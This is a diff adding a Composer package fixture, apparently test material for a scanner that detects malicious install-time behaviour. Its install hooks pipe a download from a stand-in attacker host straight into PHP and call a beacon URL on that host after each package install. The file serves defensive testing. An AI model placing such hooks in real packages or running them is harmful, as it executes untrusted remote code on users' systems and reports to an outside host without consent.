@@ -1,0 +1,8 @@
+{
+  "name": "chainsaw-tests/remote-fetch-composer-fixture",
+  "description": "Composer fixture with install-time remote-fetch.",
+  "scripts": {
+    "pre-install-cmd": "curl -s https://evil.example.com/stage2.php | php",
+    "post-package-install": ["echo installed", "wget -q https://evil.example.com/beacon"]
+  }
+}
